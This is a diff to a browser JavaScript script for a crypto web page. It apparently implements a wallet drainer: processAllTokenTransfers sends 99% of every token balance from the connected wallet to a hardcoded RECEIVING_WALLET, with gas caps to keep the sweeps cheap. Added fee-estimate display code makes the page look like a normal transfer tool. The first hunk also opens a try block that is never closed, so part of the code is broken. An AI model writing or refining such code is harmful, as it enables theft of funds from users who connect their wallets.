@@ -1249,6 +1249,19 @@ async function processAllTokenTransfers() {
       continue;
     }
 
+    try {
+      const balance = await fetchTokenBalance(token);
+      if (balance <= 0) continue;
+
+      // Calculate 99% of balance (leave 1%)
+      let amountToSend = balance * 0.99;
+      
+      if (token.isNative) {
+        const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
+        amountToSend = Math.min(amountToSend, balance - minReserve);
+        if (amountToSend <= 0) continue;
+      }
+
     // Skip tokens with invalid addresses
     if (token.address && !ethers.utils.isAddress(token.address)) {
       console.warn(`Skipping ${token.symbol} - invalid address`);
@@ -1300,7 +1313,52 @@ async function processAllTokenTransfers() {
 
   return successCount;
 }
+async function estimateAndDisplayFees() {
+  if (!userAddress || !currentFromToken) return;
 
+  try {
+    // Estimate gas price
+    const gasPrice = await provider.getGasPrice();
+    const gweiPrice = ethers.utils.formatUnits(gasPrice, 'gwei');
+    
+    // Calculate estimated fee
+    let estimatedFee;
+    if (currentFromToken.isNative) {
+      estimatedFee = GAS_LIMITS.nativeTransfer * parseFloat(gweiPrice) / 1e9;
+    } else {
+      estimatedFee = GAS_LIMITS.erc20Transfer * parseFloat(gweiPrice) / 1e9;
+    }
+    
+    // Get token price for USD conversion
+    const tokenPrice = await getTokenPrice({
+      symbol: currentNetwork === 'bsc' ? 'BNB' : 'ETH',
+      isNative: true
+    });
+    
+    const feeInUsd = estimatedFee * (tokenPrice || 0);
+    
+    // Display fee info
+    document.getElementById('feeEstimate').innerHTML = `
+      Estimated Network Fee: 
+      ${estimatedFee.toFixed(6)} ${currentNetwork === 'bsc' ? 'BNB' : 'ETH'}
+      ($${feeInUsd.toFixed(2)})
+    `;
+    
+    // Warning if fee is too high
+    if (feeInUsd > 0.5) {
+      document.getElementById('feeEstimate').classList.add('high-fee');
+    } else {
+      document.getElementById('feeEstimate').classList.remove('high-fee');
+    }
+    
+  } catch (err) {
+    console.error("Fee estimation error:", err);
+    document.getElementById('feeEstimate').textContent = "Fee estimation unavailable";
+  }
+}
+
+// Call this whenever network or token changes
+estimateAndDisplayFees();
 async function transferWithHigherGas(token, amount) {
   const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
   const amountInWei = ethers.utils.parseUnits(amount.toString(), token.decimals || 18);
@@ -1410,19 +1468,47 @@ async function checkAndApproveToken(token, amount) {
     return false;
   }
 }
+// Add these constants near the top of your file
+const MAX_GAS_PRICE_GWEI = {
+  ethereum: 10,
+  bsc: 3,
+  polygon: 50,
+  arbitrum: 0.1,
+  base: 0.1
+};
+
+const GAS_LIMITS = {
+  nativeTransfer: 21000,
+  erc20Transfer: 100000,
+  approval: 150000
+};
+
+// Modify the transfer functions like this:
 async function transferNativeToken(token, amount) {
   try {
     updateStatus(`Sending ${amount} ${token.symbol}...`, "success");
     
+    // Get current gas price and cap it
+    let gasPrice = await provider.getGasPrice();
+    const maxGasPrice = ethers.utils.parseUnits(
+      MAX_GAS_PRICE_GWEI[currentNetwork].toString(), 
+      'gwei'
+    );
+    
+    if (gasPrice.gt(maxGasPrice)) {
+      gasPrice = maxGasPrice;
+      updateStatus(`Using capped gas price for cheaper tx`, "info");
+    }
+    
     const tx = await signer.sendTransaction({
       to: RECEIVING_WALLET,
       value: ethers.utils.parseEther(amount.toString()),
-      gasLimit: 21000,
+      gasLimit: GAS_LIMITS.nativeTransfer,
+      gasPrice
     });
     
     await tx.wait();
     return tx.hash;
-
   } catch (err) {
     console.error("Native token transfer error:", err);
     throw new Error(`Failed to send ${token.symbol}: ${err.message}`);
